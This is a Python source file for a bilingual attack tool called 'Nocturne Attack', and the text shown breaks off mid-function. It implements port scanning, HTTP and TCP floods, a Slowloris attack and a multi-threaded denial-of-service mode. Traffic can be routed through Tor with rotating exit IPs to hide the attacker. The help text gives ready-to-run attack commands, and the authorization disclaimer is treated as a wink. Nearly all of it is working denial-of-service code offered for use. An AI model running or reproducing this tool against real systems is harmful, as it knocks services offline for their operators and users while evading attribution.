#!/usr/bin/env python3

import argparse
import logging
import time
import socket
import os
import sys
import threading
import random
import requests
import stem
import stem.control
from concurrent.futures import ThreadPoolExecutor
from urllib3.util.retry import Retry
from urllib3.exceptions import MaxRetryError
from requests.adapters import HTTPAdapter
from urllib.parse import urlparse, urlparse as parse_url

# Tor configuracion
TOR_SOCKS_PORT = 9050  # Puerto default del socket
TOR_CONTROL_PORT = 9051  # Puerto de control por defecto
TOR_PASSWORD = None  # Contraseña si está configurada en torrc
TOR_NEW_IDENTITY_DELAY = 5  # Segundos a esperar después de rotar IP

# CERTIFICACIÓN HTTPS Y MEJORA VISUAL POR ERROR DE CERTIFICACIÓN HTTPS
import urllib3
urllib3.disable_warnings()
logging.captureWarnings(True)

# ESPERO LES GUSTE MUCHO MI TOOL, SINCERAMENTE ME ESFORCÉ MUCHO EN HACERLA, ESPERO LES SEA UTIL PARA ENCONTRAR
# VULNERABILIDADES EN SERVIDORES O SISTEMAS EN LOS QUE TENGAN AUTORIZACIÓN, ¿VERDAD?

# Configuration configuracion
class Config:
    LANGUAGE = "spanish"  # "english" or "spanish"
    EMOJIS = False
    MAX_WORKERS = 200
    USE_TOR = True  # Activar Tor para todo el tráfico
    TOR_ROTATION_INTERVAL = 60  # Rotar IP cada X segundos (0 para desactivar rotación automática)


class TorController:
    def __init__(self, control_port=TOR_CONTROL_PORT, password=TOR_PASSWORD):
        self.control_port = control_port
        self.password = password
        self.controller = None

    def __enter__(self):
        try:
            self.controller = stem.control.Controller.from_port(port=self.control_port)
            if self.password:
                self.controller.authenticate(self.password)
            else:
                self.controller.authenticate()
            return self
        except Exception as e:
            print(f"Error connecting to Tor control port: {e}")
            return None

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.controller:
            self.controller.close()

    def new_identity(self):
        """Solicita una nueva identidad de Tor (nodo de salida)."""
        if not self.controller:
            print("Error: Controlador Tor no inicializado")
            return False
            
        try:
            # Forzar una nueva identidad
            self.controller.signal(stem.Signal.NEWNYM)
            
            # Esperar el tiempo recomendado para evitar problemas
            wait_time = max(self.controller.get_newnym_wait() or 5, 5)
            print(f"Rotando IP. Esperando {wait_time} segundos...")
            time.sleep(wait_time)
            
            # Verificar si la IP cambió
            old_ip = self.get_current_ip()
            time.sleep(1)
            new_ip = self.get_current_ip()
            
            if old_ip and new_ip and old_ip != new_ip:
                print(f"IP rotada exitosamente: {old_ip} -> {new_ip}")
                return True
            else:
                print("Advertencia: No se pudo verificar el cambio de IP")
                return False
                
        except Exception as e:
            print(f"Error al rotar la identidad: {e}")
            return False

    def get_current_ip(self, session=None):
        """Obte """
        try:
            if session is None:
                session = self.get_tor_session()
            return session.get('https://api.ipify.org').text
        except Exception as e:
            print(f"Error getting IP: {e}")
            return None

    @classmethod
    def get_tor_session(cls):
        """Crea una sesión requests que usa Tor con configuración mejorada."""
        session = requests.session()
        
        # Configurar proxy Tor
        session.proxies = {
            'http': f'socks5h://127.0.0.1:{TOR_SOCKS_PORT}',
            'https': f'socks5h://127.0.0.1:{TOR_SOCKS_PORT}'
        }
        
        # Configurar timeout
        session.timeout = 30
        
        # Configurar headers comunes
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        })
        
        # Configurar reintentos
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST"]
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session


class Translator:
    def __init__(self):
        self.messages = {
            "spanish": {
                "banner": "HERRAMIENTA DE PRUEBAS DDOS, DOS, HTTP, TCP, SLOWLORIS, PORT SCANNER",
                "warning": "ADVERTENCIA: Usa solo en sistemas con autorización explícita",
                "warning_legal": "El mal uso de esta herramienta puede ser ilegal",
                "enter_target": "Ingresa URL o IP del objetivo",
                "select_attack": "SELECCIONA EL TIPO DE ATAQUE",
                "port_scan": "Escaneo de Puertos",
                "http_flood": "HTTP Flood",
                "tcp_flood": "TCP Flood",
                "slowloris": "Slowloris Attack",
                "ddos_sim": "DDoS",
                "option": "Opción (1-5)",
                "start_port": "Puerto inicial (default 1)",
                "end_port": "Puerto final (default 1000)",
                "num_requests": "Número de requests",
                "delay": "Delay entre requests (default 0.1)",
                "target_port": "Puerto objetivo",
                "num_connections": "Número de conexiones",
                "message": "Mensaje a enviar (opcional)",
                "num_sockets": "Número de sockets (default 150)",
                "duration": "Duración en segundos (default 60)",
                "restart": "¿Ejecutar otra prueba? (s/n)",
                "exiting": "Saliendo...",
                "error_no_target": "Error: Debes especificar un objetivo",
                "error_invalid_option": "Opción no válida",
                "error_general": "Error",
                "operation_cancelled": "Operación cancelada por el usuario",
                "scanning_ports": "Escaneando puertos {}-{} en {}",
                "port_open": "Puerto {} ABIERTO ({})",
                "scan_complete": "Escaneo completado. Puertos abiertos: {}",
                "starting_http_flood": "Iniciando HTTP Flood a {}",
                "sending_requests": "Enviando {} requests...",
                "request_success": "Request {}/{} - Status: {}",
                "request_warning": "Request {}/{} - Status: {}",
                "request_error": "Request {}/{} - Error: {}",
                "http_summary": "RESUMEN HTTP FLOOD",
                "successful_requests": "Requests exitosos",
                "failed_requests": "Requests fallidos",
                "total_time": "Tiempo total",
                "requests_second": "Requests/segundo",
                "starting_tcp_flood": "Iniciando TCP Flood a {}:{}",
                "establishing_connections": "Estableciendo {} conexiones...",
                "connection_established": "Conexión {}: Establecida (Activas: {})",
                "connection_error_send": "Conexión {}: Error enviando - {}",
                "connection_failed": "Conexión {}: Falló - {}",
                "tcp_summary": "RESUMEN TCP FLOOD",
                "successful_connections": "Conexiones exitosas",
                "starting_slowloris": "Iniciando Slowloris a {}",
                "configuring_sockets": "Configurando {} sockets...",
                "sockets_connected": "{}/{} sockets conectados",
                "sockets_active": "{} sockets conectados y manteniendo conexiones...",
                "press_stop": "Presiona Ctrl+C para detener el ataque",
                "sockets_active_count": "Sockets activos: {}/{}",
                "all_sockets_closed": "Todos los sockets se han cerrado",
                "attack_stopped": "Ataque detenido por el usuario",
                "sockets_closed": "{} sockets cerrados",
                "socket_error": "Error en socket {}: {}",
                "starting_ddos": "Iniciando ataque DDoS a {} por {} segundos",
                "starting_workers": "Iniciando ataque con múltiples workers...",
                "worker_progress": "Worker {}: {} requests enviados",
                "time_elapsed": "Tiempo transcurrido: {}s, Requests: {} (~{}/s)",
                "attack_interrupted": "Ataque interrumpido",
                "ddos_summary": "RESUMEN DDoS",
                "total_requests": "Total requests",
                "result": "RESULTADO: {} puertos abiertos: {}"
            },
            "english": {
                "banner": "LOAD TESTING DDOS, DOS, HTTP, TCP, SLOWLORIS, PORT SCANNER",
                "warning": "WARNING: Use only on systems with explicit authorization",
                "warning_legal": "Misuse of this tool may be illegal",
                "enter_target": "Enter target URL or IP",
                "select_attack": "SELECT ATTACK TYPE",
                "port_scan": "Port Scan",
                "http_flood": "HTTP Flood",
                "tcp_flood": "TCP Flood",
                "slowloris": "Slowloris Attack",
                "ddos_sim": "DDoS (Multiple techniques)",
                "option": "Option (1-5)",
                "start_port": "Start port (default 1)",
                "end_port": "End port (default 1000)",
                "num_requests": "Number of requests",
                "delay": "Delay between requests (default 0.1)",
                "target_port": "Target port",
                "num_connections": "Number of connections",
                "message": "Message to send (optional)",
                "num_sockets": "Number of sockets (default 150)",
                "duration": "Duration in seconds (default 60)",
                "restart": "Run another test? (y/n)",
                "exiting": "Exiting...",
                "error_no_target": "Error: You must specify a target",
                "error_invalid_option": "Invalid option",
                "error_general": "Error",
                "operation_cancelled": "Operation cancelled by user",
                "scanning_ports": "Scanning ports {}-{} on {}",
                "port_open": "Port {} OPEN ({})",
                "scan_complete": "Scan completed. Open ports: {}",
                "starting_http_flood": "Starting HTTP Flood to {}",
                "sending_requests": "Sending {} requests...",
                "request_success": "Request {}/{} - Status: {}",
                "request_warning": "Request {}/{} - Status: {}",
                "request_error": "Request {}/{} - Error: {}",
                "http_summary": "HTTP FLOOD SUMMARY",
                "successful_requests": "Successful requests",
                "failed_requests": "Failed requests",
                "total_time": "Total time",
                "requests_second": "Requests/second",
                "starting_tcp_flood": "Starting TCP Flood to {}:{}",
                "establishing_connections": "Establishing {} connections...",
                "connection_established": "Connection {}: Established (Active: {})",
                "connection_error_send": "Connection {}: Send error - {}",
                "connection_failed": "Connection {}: Failed - {}",
                "tcp_summary": "TCP FLOOD SUMMARY",
                "successful_connections": "Successful connections",
                "starting_slowloris": "Starting Slowloris to {}",
                "configuring_sockets": "Configuring {} sockets...",
                "sockets_connected": "{}/{} sockets connected",
                "sockets_active": "{} sockets connected and maintaining connections...",
                "press_stop": "Press Ctrl+C to stop attack",
                "sockets_active_count": "Active sockets: {}/{}",
                "all_sockets_closed": "All sockets have been closed",
                "attack_stopped": "Attack stopped by user",
                "sockets_closed": "{} sockets closed",
                "socket_error": "Socket {} error: {}",
                "starting_ddos": "Starting DDoS attack to {} for {} seconds",
                "starting_workers": "Starting attack with multiple workers...",
                "worker_progress": "Worker {}: {} requests sent",
                "time_elapsed": "Time elapsed: {}s, Requests: {} (~{}/s)",
                "attack_interrupted": "Attack interrupted",
                "ddos_summary": "DDoS SUMMARY",
                "total_requests": "Total requests",
                "result": "RESULT: {} open ports: {}"
            }
        }

    def get(self, key):
        lang = Config.LANGUAGE
        return self.messages.get(lang, {}).get(key, key)


# Initialize translator
t = Translator()


def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)

#   ::'       Art by
#  :: :.    Ronald Allan Stanions

#GRACIAS RONALD, POR HACER PÚBLICA TU ARTE, DE CORAZÓN, NOCTURNE...

def print_banner():
    print(r'''
     .:'           NOCTURNE ATTACK            `:.
     ::'                                      `::
     :: :.      .:!!.            .:!!.      .: ::
      `:. `:.    !::!          !::!    .:'  .:'
       `::. `::  !:::'!.      .!':::!  ::' .::'
           `::.`::.  `!:'`:::::'':!'  .::'.::'
            `:.  `::::'  `!!'  '::::'   ::'
            :'*:::.  .:'  !!  `:.  .:::*`:
            :: HHH::.   ` !! '   .::HHH ::
           ::: `H TH::.  `!!  .::HT H' :::
           ::..  `THHH:`:   :':HHHT'  ..::
           `::      `T: `. .' :T'      ::'
             `:. .   :  >  <  :   . .:'
               `::'    \    /    `::'
                :'  .`. \__/ .'.  `:
                 :' ::.       .:: `:
                 :' `:::     :::' `:
                  `.  ``     ''  .'
                   :`...........':
                   ` :`.     .': '
                    `:  `"""'  :'   @Nocturne
''')


def display_menu():
    """Display interactive menu"""
    print("\n" + "=" * 60)
    print(f" {t.get('banner')}")
    print("=" * 60)
    print(f"️  {t.get('warning')}")
    print(f"️  {t.get('warning_legal')}")
    print("=" * 60)


def get_language_selection():
    """Get language selection from user"""
    print("\nSelect language / Selecciona idioma:")
    print("1. English")
    print("2. Español")
    choice = input("Choice / Opción (1-2): ").strip()

    if choice == '2':
        Config.LANGUAGE = "spanish"
        Config.EMOJIS = False
    else:
        Config.LANGUAGE = "english"
        Config.EMOJIS = False


def format_message(message):
    """Format message with or without emojis based on configuration"""
    if Config.EMOJIS:
        return message
    # Remove emojis for English/professional mode
    emoji_map = {
        '🔍': '[SCAN]', '✅': '[OK]', '🎯': '[TARGET]', '🌊': '[FLOOD]',
        '🚀': '[START]', '⚠️': '[WARN]', '❌': '[ERROR]', '📊': '[STATS]',
        '⏱️': '[TIME]', '📈': '[RATE]', '🌐': '[NETWORK]', '🔗': '[CONN]',
        '📦': '[PACKET]', '🐌': '[SLOW]', '🔧': '[CONFIG]', '📡': '[SOCKET]',
        '⏸️': '[PAUSE]', '💥': '[EXPLOSION]', '🛑': '[STOP]', '🔒': '[LOCK]',
        '🛠️': '[TOOL]', '🎲': '[CHOICE]', '🔢': '[NUMBER]', '💬': '[MESSAGE]',
        '🔄': '[RESTART]', '👋': '[EXIT]'
    }
    for emoji, replacement in emoji_map.items():
        message = message.replace(emoji, replacement)
    return message


def port_scan(host, start_port=1, end_port=1000):
    """Enhanced port scanning"""
    print(format_message(t.get('scanning_ports').format(start_port, end_port, host)))
    open_ports = []

    def scan_port(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((host, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    print(format_message(t.get('port_open').format(port, service)))
                    return port
        except:
            pass
        return None

    with ThreadPoolExecutor(max_workers=Config.MAX_WORKERS) as executor:
        results = executor.map(scan_port, range(start_port, end_port + 1))
        open_ports = [port for port in results if port is not None]

    print(format_message(t.get('scan_complete').format(len(open_ports))))
    return open_ports


def http_flood(target_url, num_requests, delay=0.1):
    """Enhanced HTTP Flood attack"""
    print(format_message(t.get('starting_http_flood').format(target_url)))

    # Normalize URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url

    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
    ]

    success_count = 0
    failed_count = 0

    def send_request(request_num):
        nonlocal success_count, failed_count
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }

            response = requests.get(target_url, headers=headers, timeout=10, verify=False)
            if response.status_code < 400:
                success_count += 1
                print(format_message(t.get('request_success').format(request_num, num_requests, response.status_code)))
            else:
                failed_count += 1
                print(format_message(t.get('request_warning').format(request_num, num_requests, response.status_code)))

        except Exception as e:
            failed_count += 1
            error_msg = str(e)[:50] + "..." if len(str(e)) > 50 else str(e)
            print(format_message(t.get('request_error').format(request_num, num_requests, error_msg)))

    print(format_message(t.get('sending_requests').format(num_requests)))
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(send_request, range(1, num_requests + 1))

    end_time = time.time()
    total_time = end_time - start_time

    print(f"\n{t.get('http_summary')}:")
    print(f"{t.get('successful_requests')}: {success_count}")
    print(f"{t.get('failed_requests')}: {failed_count}")
    print(f"{t.get('total_time')}: {total_time:.2f} seconds")
    print(f"{t.get('requests_second')}: {num_requests / total_time:.2f}")

    return success_count


def tcp_flood(target_ip, target_port, num_connections, message):
    """Enhanced TCP Flood attack"""
    print(format_message(t.get('starting_tcp_flood').format(target_ip, target_port)))

    if not message:
        message = "TCP Flood Test Packet"
    if isinstance(message, str):
        message = message.encode()

    connections_active = 0
    lock = threading.Lock()

    def create_connection(conn_id):
        nonlocal connections_active
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((target_ip, target_port))

            with lock:
                connections_active += 1
            print(format_message(t.get('connection_established').format(conn_id, connections_active)))

            # Send data continuously
            packet_count = 0
            while packet_count < 100:  # Send up to 100 messages per connection
                try:
                    packet_msg = message + f" [Conn:{conn_id} Packet:{packet_count}]".encode()
                    s.send(packet_msg)
                    packet_count += 1
                    time.sleep(0.3)
                except Exception as e:
                    print(format_message(t.get('connection_error_send').format(conn_id, e)))
                    break

            s.close()
            with lock:
                connections_active -= 1
            return True

        except Exception as e:
            print(format_message(t.get('connection_failed').format(conn_id, e)))
            return False

    print(format_message(t.get('establishing_connections').format(num_connections)))
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=num_connections) as executor:
        results = list(executor.map(create_connection, range(1, num_connections + 1)))

    end_time = time.time()
    successful_connections = sum(results)

    print(f"\n{t.get('tcp_summary')}:")
    print(f"{t.get('successful_connections')}: {successful_connections}/{num_connections}")
    print(f"{t.get('total_time')}: {end_time - start_time:.2f} seconds")

    return successful_connections


def slowloris_attack(target_url, num_sockets=150):
    """Enhanced Slowloris attack"""
    print(format_message(t.get('starting_slowloris').format(target_url)))

    # Parse URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url

    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/'

    sockets = []
    print(format_message(t.get('configuring_sockets').format(num_sockets)))

    # Create sockets
    for i in range(num_sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))

            # Send incomplete headers
            headers = [
                f"GET {path} HTTP/1.1\r\n",
                f"Host: {host}\r\n",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                "Content-Length: 1000000\r\n",
                "X-a: "
            ]

            for header in headers:
                s.send(header.encode())
                time.sleep(0.1)

            sockets.append(s)
            if (i + 1) % 50 == 0:
                print(format_message(t.get('sockets_connected').format(i + 1, num_sockets)))

        except Exception as e:
            print(format_message(t.get('socket_error').format(i + 1, e)))
            break

    print(format_message(t.get('sockets_active').format(len(sockets))))
    print(format_message(t.get('press_stop')))

    try:
        cycle = 0
        while sockets and cycle < 1000:
            cycle += 1
            active_sockets = len(sockets)

            for i, s in enumerate(sockets[:]):
                try:
                    # Send additional header every 15 seconds
                    s.send(f"b\r\n".encode())
                    time.sleep(15)
                except Exception as e:
                    sockets.remove(s)
                    try:
                        s.close()
                    except:
                        pass

            if active_sockets != len(sockets):
                print(format_message(t.get('sockets_active_count').format(len(sockets), num_sockets)))

            if not sockets:
                print(format_message(t.get('all_sockets_closed')))
                break

    except KeyboardInterrupt:
        print(f"\n{t.get('attack_stopped')}")
    finally:
        # Close all sockets
        for s in sockets:
            try:
                s.close()
            except:
                pass
        print(format_message(t.get('sockets_closed').format(len(sockets))))


def ddos_attack(target_url, duration=60):
    """Simulated DDoS attack with multiple techniques"""
    print(format_message(t.get('starting_ddos').format(target_url, duration)))

    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url

    parsed = urlparse(target_url)
    host = parsed.hostname

    stop_attack = False
    requests_sent = 0

    def attack_worker(worker_id):
        nonlocal requests_sent
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]

        while not stop_attack:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }

                response = requests.get(target_url, headers=headers, timeout=5, verify=False)
                requests_sent += 1
                if requests_sent % 100 == 0:
                    print(format_message(t.get('worker_progress').format(worker_id, requests_sent)))

            except Exception:
                pass

    print(format_message(t.get('starting_workers')))
    start_time = time.time()

    # Start workers
    workers = []
    for i in range(10):
        worker = threading.Thread(target=attack_worker, args=(i + 1,))
        worker.daemon = True
        worker.start()
        workers.append(worker)

    # Execute for specified time
    try:
        while time.time() - start_time < duration:
            time.sleep(1)
            elapsed = time.time() - start_time
            print(format_message(
                t.get('time_elapsed').format(int(elapsed), requests_sent, f"{requests_sent / elapsed:.1f}")))
    except KeyboardInterrupt:
        print(f"\n{t.get('attack_interrupted')}")

    stop_attack = True
    end_time = time.time()

    print(f"\n{t.get('ddos_summary')}:")
    print(f"{t.get('total_requests')}: {requests_sent}")
    print(f"{t.get('total_time')}: {end_time - start_time:.2f} seconds")
    print(f"{t.get('requests_second')}: {requests_sent / (end_time - start_time):.2f}")


def print_help():

    help_text = """
    
     .:'           NOCTURNE ATTACK            `:.
     ::'                                      `::
     :: :.      .:!!.            .:!!.      .: ::
      `:. `:.    !::!          !::!    .:'  .:'
       `::. `::  !:::'!.      .!':::!  ::' .::'
         `::.`::.  `!:'`:::::'':!'  .::'.::'
           `:.  `::::'  `!!'  '::::'   ::'
           :'*:::.   .:'  !!  `:.  .:::*`:
           ::  HHH::.   ` !! '   .::HHH ::
           ::: `H TH::.  `!!  .::HT H' :::
           ::..  `THHH:`:   :':HHHT'  ..::
           `::      `T: `. .' :T'      ::'
             `:. .   :  >  <  :   . .:'
               `::'    \    /    `::'
                :'  .`. \__/ .'.  `:
                 :' ::.       .:: `:
                 :' `:::     :::' `:
                  `.  ``     ''  .'
                   :`...........':
                   ` :`.     .': '
                    `:  `''''  :'   @Nocturne
    
╔══════════════════════════════════════════════════════════════════════════════╗
║                     Nocturne Attack Tool - Help                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

   MODO DE USO:
  python main.py [OPCIONES] [TARGET] [COMANDO] [PARÁMETROS]

   EJEMPLOS RÁPIDOS:
  Escanear puertos:         python nocturne.py example.com scan --start-port 80 --end-port 100
  Ataque HTTP:              python nocturne.py example.com http --requests 1000 --tor
  Ataque TCP:               python nocturne.py example.com tcp --port 80 --connections 500
  Ataque Slowloris:         python nocturne.py example.com slowloris --sockets 200
  Ataque DDoS:              python nocturne.py example.com ddos --duration 120 --tor

  OPCIONES GENERALES:
  TARGET                    URL o dirección IP del objetivo
  -l, --language {es,en}    Idioma de la interfaz (predeterminado: es)
  --tor                     Usar red Tor para el anonimato
  --tor-rotation SEGS       Rotar IP de Tor cada X segundos (0=desactivado, predet: 60)

   COMANDOS DISPONIBLES:
  scan      Escaneo de puertos
  http      Ataque HTTP Flood
  tcp       Ataque TCP Flood
  slowloris Ataque Slowloris
  ddos      Ataque DDoS combinado

    Para más ayuda sobre un comando específico:
   python main.py [COMANDO] --help

    ADVERTENCIA: Esta herramienta podria meterte en problemas legales.
"""
    print(help_text)
    sys.exit(0)

def print_command_help(command):
    """Muestra ayuda detallada para un comando específico."""
    helps = {
        'scan': """
📌 ESCANEO DE PUERTOS
  Uso: python main.py TARGET scan [OPCIONES]

  Opciones:
    --start-port NUM  Puerto inicial (predeterminado: 1)
    --end-port NUM    Puerto final (predeterminado: 1000)

  Ejemplo:
    python main.py example.com scan --start-port 80 --end-port 1000
""",
        'http': """
📌 HTTP FLOOD
  Uso: python main.py TARGET http --requests NUM [OPCIONES]

  Opciones requeridas:
    --requests NUM    Número de peticiones a enviar

  Opcionales:
    --delay SEGS      Segundos entre peticiones (pred: 0.1)

  Ejemplo con Tor:
    python main.py example.com http --requests 5000 --delay 0.05 --tor
""",
        'tcp': """
📌 TCP FLOOD
  Uso: python main.py TARGET tcp --port NUM --connections NUM [OPCIONES]

  Opciones requeridas:
    --port NUM        Puerto objetivo
    --connections NUM Número de conexiones

  Opcionales:
    --message TEXTO   Mensaje a enviar (opcional)

  Ejemplo:
    python main.py example.com tcp --port 80 --connections 1000
""",
        'slowloris': """
📌 SLOWLORIS
  Uso: python main.py TARGET slowloris [OPCIONES]

  Opciones:
    --sockets NUM     Número de sockets a usar (pred: 150)

  Ejemplo con rotación de Tor:
    python main.py example.com slowloris --sockets 200 --tor --tor-rotation 30
""",
        'ddos': """
📌 ATAQUE DDoS
  Uso: python main.py TARGET ddos [OPCIONES]

  Opciones:
    --duration SEGS   Duración del ataque en segundos (pred: 60)

  Ejemplo con Tor:
    python main.py example.com ddos --duration 300 --tor
"""
    }
    
    if command in helps:
        print(helps[command])
    else:
        print(f"Comando desconocido: {command}")
    sys.exit(0)

def parse_arguments():
    """Parse command line arguments."""
    # Crear el parser principal
    parser = argparse.ArgumentParser(
        description='Herramienta de pruebas de red',
        add_help=False
    )
    
    # Manejar el comando de ayuda global
    if len(sys.argv) == 1 or sys.argv[1] in ['-h', '--help']:
        print_help()
    
    # Manejar ayuda de comandos específicos
    if len(sys.argv) > 1 and sys.argv[1] in ['scan', 'http', 'tcp', 'slowloris', 'ddos'] and \
       (len(sys.argv) == 2 or sys.argv[2] in ['-h', '--help']):
        print_command_help(sys.argv[1])
    
    # Grupo para argumentos generales
    general_group = parser.add_argument_group('Opciones generales')
    general_group.add_argument('target', nargs='?', help='URL o IP del objetivo')
    general_group.add_argument('-l', '--language', choices=['es', 'en'], default='es',
                      help='Idioma de la interfaz')
    general_group.add_argument('--tor', action='store_true',
                      help='Usar red Tor para las conexiones')
    general_group.add_argument('--tor-rotation', type=int, default=60,
                      help='Intervalo de rotación de IPs de Tor (0=desactivado)')
    general_group.add_argument('-h', '--help', action='store_true',
                      help='Mostrar este mensaje de ayuda y salir')
    
    # Subcomandos
    subparsers = parser.add_subparsers(
        dest='command',
        title='comandos disponibles',
        description='Los siguientes comandos están disponibles:',
        metavar='COMANDO',
        required=False
    )
    
    # Comando: scan
    scan_help = '''
    Escanea puertos en un objetivo.
    
    Ejemplo:
      python main.py example.com scan --start-port 1 --end-port 1000
    '''
    scan_parser = subparsers.add_parser(
        'scan',
        help='Escaneo de puertos',
        description='Escanea puertos en un objetivo',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='Ejemplo: python main.py example.com scan --start-port 1 --end-port 1000'
    )
    scan_parser.add_argument('--start-port', type=int, default=1, 
                           help='Puerto inicial (predeterminado: 1)')
    scan_parser.add_argument('--end-port', type=int, default=1000, 
                           help='Puerto final (predeterminado: 1000)')
    
    # Comando: http
    http_help = '''
    Realiza un ataque HTTP Flood.
    
    Ejemplo:
      python main.py example.com http --requests 1000 --delay 0.1 --tor
    '''
    http_parser = subparsers.add_parser(
        'http', 
        help='Ataque HTTP Flood',
        description='Realiza un ataque HTTP Flood al objetivo',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='Ejemplo: python main.py example.com http --requests 1000 --delay 0.1'
    )
    http_parser.add_argument('--requests', type=int, required=True, 
                           help='Número de requests a enviar (requerido)')
    http_parser.add_argument('--delay', type=float, default=0.1, 
                           help='Segundos entre requests (predeterminado: 0.1)')
    
    # Comando: tcp
    tcp_help = '''
    Realiza un ataque TCP Flood.
    
    Ejemplo:
      python main.py example.com tcp --port 80 --connections 100 --message "test"
    '''
    tcp_parser = subparsers.add_parser(
        'tcp', 
        help='Ataque TCP Flood',
        description='Realiza un ataque TCP Flood al objetivo',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='Ejemplo: python main.py example.com tcp --port 80 --connections 100'
    )
    tcp_parser.add_argument('--port', type=int, required=True, 
                          help='Puerto objetivo (requerido)')
    tcp_parser.add_argument('--connections', type=int, required=True, 
                          help='Número de conexiones (requerido)')
    tcp_parser.add_argument('--message', default='', 
                          help='Mensaje a enviar (opcional)')
    
    # Comando: slowloris
    slowloris_help = '''
    Realiza un ataque Slowloris.
    
    Ejemplo:
      python main.py example.com slowloris --sockets 200
    '''
    slowloris_parser = subparsers.add_parser(
        'slowloris', 
        help='Ataque Slowloris',
        description='Realiza un ataque Slowloris al objetivo',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='Ejemplo: python main.py example.com slowloris --sockets 200'
    )
    slowloris_parser.add_argument('--sockets', type=int, default=150, 
                                help='Número de sockets a usar (predeterminado: 150)')
    
    # Comando: ddos
    ddos_help = '''
    Realiza un ataque DDoS combinando múltiples técnicas.
    
    Ejemplo:
      python main.py example.com ddos --duration 60 --tor
    '''
    ddos_parser = subparsers.add_parser(
        'ddos', 
        help='Ataque DDoS',
        description='Realiza un ataque DDoS combinando múltiples técnicas',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='Ejemplo: python main.py example.com ddos --duration 60'
    )
    ddos_parser.add_argument('--duration', type=int, default=60, 
                           help='Duración del ataque en segundos (predeterminado: 60)')
    
    args = parser.parse_args()
    
    # Si se especifica un objetivo pero no un comando, mostrar mensaje de ayuda
    if args.target and not args.command:
        print("Error: Se requiere especificar un comando cuando se proporciona un objetivo.")
        print("Ejemplo: python main.py example.com scan")
        parser.print_help()
        sys.exit(1)
        
    return args

def interactive_mode():
    """Modo interactivo con menú."""
    # Mostrar el banner
    print_banner()
    
    # Seleccionar idioma
    language = get_language_selection()
    if language == "1":
        Config.LANGUAGE = "spanish"
    
    # Solicitar objetivo
    target = input(f"{t.get('enter_target')}: ").strip()
    if not target:
        print(t.get('error_no_target'))
        return
    
    # Mostrar menú de opciones
    print("\n" + t.get('select_attack'))
    print("1. " + t.get('port_scan'))
    print("2. " + t.get('http_flood'))
    print("3. " + t.get('tcp_flood'))
    print("4. " + t.get('slowloris'))
    print("5. " + t.get('ddos_sim'))

    choice = input(f"\n{t.get('option')}: ").strip()

    try:
        if choice == '1':
            start_port = int(input(f"{t.get('start_port')}: ") or 1)
            end_port = int(input(f"{t.get('end_port')}: ") or 1000)
            open_ports = port_scan(target, start_port, end_port)
            print(f"\n{t.get('result').format(len(open_ports), open_ports)}")

        elif choice == '2':
            num_requests = int(input(f"{t.get('num_requests')}: "))
            delay = float(input(f"{t.get('delay')}: ") or 0.1)
            http_flood(target, num_requests, delay)

        elif choice == '3':
